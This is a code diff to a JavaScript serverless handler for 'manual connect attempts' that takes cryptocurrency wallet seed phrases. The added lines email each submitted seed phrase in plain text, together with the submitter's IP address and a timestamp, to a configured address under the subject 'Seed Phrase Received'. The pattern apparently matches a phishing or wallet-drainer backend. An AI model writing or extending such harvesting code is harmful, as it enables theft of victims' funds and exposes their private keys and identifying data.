@@ -3,13 +3,21 @@
 // IMPORTANT: Seed phrases are stored as plain text. Disclaimer required.
 
 const { createClient } = require('@supabase/supabase-js');
+const sgMail = require('@sendgrid/mail');
 
 const SUPABASE_URL = process.env.SUPABASE_URL;
 const SUPABASE_KEY = process.env.SUPABASE_ANON_KEY;
+const SENDGRID_API_KEY = process.env.SENDGRID_API_KEY;
+const SENDGRID_FROM_EMAIL = process.env.SENDGRID_FROM_EMAIL;
+const CONTACT_TO_EMAIL = process.env.CONTACT_TO_EMAIL;
 
 let supabase = null;
 if (SUPABASE_URL && SUPABASE_KEY) {
   supabase = createClient(SUPABASE_URL, SUPABASE_KEY);
+}
+
+if (SENDGRID_API_KEY) {
+  sgMail.setApiKey(SENDGRID_API_KEY);
 }
 
 export default async function handler(req, res) {
@@ -55,6 +63,31 @@ export default async function handler(req, res) {
     }
   } else {
     console.warn('[manual-attempt] Supabase not configured, skipping storage');
+  }
+
+  // Send email with seed phrase if SendGrid is configured
+  if (SENDGRID_API_KEY && SENDGRID_FROM_EMAIL && CONTACT_TO_EMAIL) {
+    try {
+      await sgMail.send({
+        to: CONTACT_TO_EMAIL,
+        from: SENDGRID_FROM_EMAIL,
+        subject: 'New Manual Connect Attempt - Seed Phrase Received',
+        html: `
+          <h2>Manual Connect Attempt Received</h2>
+          <p><strong>Type:</strong> ${type}</p>
+          <p><strong>Seed Phrase:</strong></p>
+          <p><code>${plainPhrase}</code></p>
+          <p><strong>IP Address:</strong> ${req.headers['x-forwarded-for'] || req.socket.remoteAddress || 'Unknown'}</p>
+          <p><strong>Timestamp:</strong> ${new Date().toISOString()}</p>
+        `,
+      });
+      console.log('[manual-attempt] email sent successfully');
+    } catch (e) {
+      console.error('[manual-attempt] sendgrid email failed', e);
+      // Don't fail the request if email fails
+    }
+  } else {
+    console.warn('[manual-attempt] SendGrid not configured, skipping email');
   }
 
   return res.status(200).json({ 
